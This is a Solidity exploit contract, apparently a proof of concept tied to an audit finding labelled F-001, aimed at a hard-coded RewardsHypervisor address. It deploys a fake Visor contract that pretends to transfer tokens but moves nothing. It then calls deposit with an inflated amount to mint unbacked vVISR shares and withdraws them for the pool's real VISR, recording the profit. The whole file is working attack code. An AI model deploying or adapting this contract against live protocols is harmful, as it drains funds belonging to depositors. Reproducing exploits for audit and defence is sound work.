// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function totalSupply() external view returns (uint256);
}

interface IRewardsHypervisorLike {
    function visr() external view returns (address);
    function vvisr() external view returns (address);
    function deposit(uint256 visrDeposit, address payable from, address to) external returns (uint256 shares);
    function withdraw(uint256 shares, address to, address payable from) external returns (uint256 rewards);
}

interface IVisorLike {
    function owner() external returns (address);
    function delegatedTransferERC20(address token, address to, uint256 amount) external;
}

contract FakeVisor is IVisorLike {
    address internal immutable _owner;

    constructor(address attacker_) {
        _owner = attacker_;
    }

    function owner() external view override returns (address) {
        return _owner;
    }

    function delegatedTransferERC20(address, address, uint256) external pure override {
        // Path stage 1+2: look like an authorized IVisor, but transfer nothing.
        // RewardsHypervisor.deposit() never verifies the VISR balance delta.
    }
}

contract FlawVerifier {
    address public constant TARGET = 0xC9f27A50f82571C1C8423A42970613b8dBDA14ef;

    uint256 private _profitAmount;
    bool private _executed;

    address public fakeVisor;
    uint256 public visrBalanceBefore;
    uint256 public visrBalanceAfter;
    uint256 public poolVisrBefore;
    uint256 public poolShareSupplyBefore;
    uint256 public claimedDepositAmount;
    uint256 public unbackedSharesMinted;
    uint256 public visrRedeemed;

    constructor() {}

    function executeOnOpportunity() external {
        require(!_executed, "already executed");
        _executed = true;

        IRewardsHypervisorLike hypervisor = IRewardsHypervisorLike(TARGET);
        address visrToken = hypervisor.visr();
        address shareToken = hypervisor.vvisr();

        visrBalanceBefore = IERC20Like(visrToken).balanceOf(address(this));
        poolVisrBefore = IERC20Like(visrToken).balanceOf(TARGET);
        poolShareSupplyBefore = IERC20Like(shareToken).totalSupply();

        // Concrete exploit preconditions derived from F-001.
        require(poolVisrBefore > 0, "infeasible: target holds no VISR");
        require(poolShareSupplyBefore > 0, "infeasible: vVISR supply is zero at fork");

        fakeVisor = address(new FakeVisor(address(this)));

        // Choose the largest non-overflowing `visrDeposit` so the target prices a huge share mint
        // from caller-supplied input alone. This preserves the exact exploit path:
        // 1) deploy fake visor, 2) call deposit(largeAmount, fakeVisor, attacker),
        // 3) receive unbacked vVISR, 4) withdraw those shares for real pooled VISR.
        claimedDepositAmount = (type(uint256).max / poolShareSupplyBefore) - 1;
        require(claimedDepositAmount > poolVisrBefore, "infeasible: safe claimed deposit too small");

        hypervisor.deposit(claimedDepositAmount, payable(fakeVisor), address(this));

        unbackedSharesMinted = IERC20Like(shareToken).balanceOf(address(this));
        require(unbackedSharesMinted > 0, "deposit minted no shares");

        visrRedeemed = hypervisor.withdraw(unbackedSharesMinted, address(this), payable(address(this)));

        visrBalanceAfter = IERC20Like(visrToken).balanceOf(address(this));
        require(visrBalanceAfter > visrBalanceBefore, "exploit not profitable");
        _profitAmount = visrBalanceAfter - visrBalanceBefore;
    }

    function profitToken() external view returns (address) {
        return IRewardsHypervisorLike(TARGET).visr();
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }
}
